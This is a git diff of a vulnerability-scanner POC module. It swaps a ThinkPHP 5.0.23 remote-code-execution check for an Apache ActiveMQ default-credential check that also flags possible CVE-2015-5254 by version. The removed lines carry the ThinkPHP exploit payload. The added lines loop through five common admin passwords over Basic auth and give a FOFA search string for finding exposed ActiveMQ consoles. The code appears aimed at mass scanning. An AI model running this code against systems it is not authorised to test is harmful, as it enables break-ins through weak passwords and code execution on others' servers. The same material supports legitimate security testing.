@@ -1,9 +1,10 @@
 # coding:utf-8  
 import requests
-from lib.core.common import url_handle,get_random_ua
+from lib.core.common import url_handle,get_random_ua,Str2Base64
 from lib.core.poc import POCBase
 # ...
 import urllib3
+import re
 urllib3.disable_warnings()
 
 class POC(POCBase):
@@ -14,22 +15,20 @@ class POC(POCBase):
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            略  
+            该POC根据版本号附带了一个CVE-2015-5254的检测，可能不是很精准  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "ThinkPHP5 5.0.23 远程代码执行漏洞",                        # 漏洞名称
+        "name" : "Apache ActiveMQ 弱口令 ➕ CVE-2015-5254",                        # 漏洞名称
         "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "ThinkPHP5",                     # 漏洞应用名称
-        "AppVersion" : "ThinkPHP5 <= 5.0.23",                  # 漏洞应用版本
+        "AppName" : "",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            ThinkPHP是一款运用极广的PHP开发框架。
-            其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，
-            导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。
+        
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="ThinkPHP"
+            app="APACHE-ActiveMQ"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -44,24 +43,35 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/index.php?s=captcha" # url自己按需调整
-        # data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1"
-        data = "_method=__construct&method=get&filter=call_user_func&get[]=phpinfo"
+        if self.port == None:
+            self.target += ":8161"
+
+        url = self.target + "/admin/" # url自己按需调整
         
-        headers = {"User-Agent":get_random_ua(),
-                    "Connection":"close",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "<title>phpinfo()</title>" in req.text and req.status_code == 200:
-                vuln = [True,req.text]
-            else:
-                vuln = [False,req.text]
+            for i in ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]:
+
+                headers = {"User-Agent":get_random_ua(),
+                            "Connection":"close",
+                            "Authorization": "Basic " + Str2Base64(i)
+                            }
+                
+                req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+                if "<title>localhost : ActiveMQ Console</title>" in req.text and req.status_code == 200:
+                    
+                    version = re.findall("<td><b>(.*)</b></td>", req.text)[1]
+                    activemq_version = version.replace(".","")
+                    
+                    if (int(activemq_version) < 5130 and len(activemq_version)==4) :
+                        vuln = [True,"<title>口令：" + i + " 版本：" + version + " 可能存在CVE-2015-5254</title>"]
+                    else:
+                        vuln = [True,"<title>口令：" + i + "</title>"]
+                    break
+
         except Exception as e:
             raise e
         
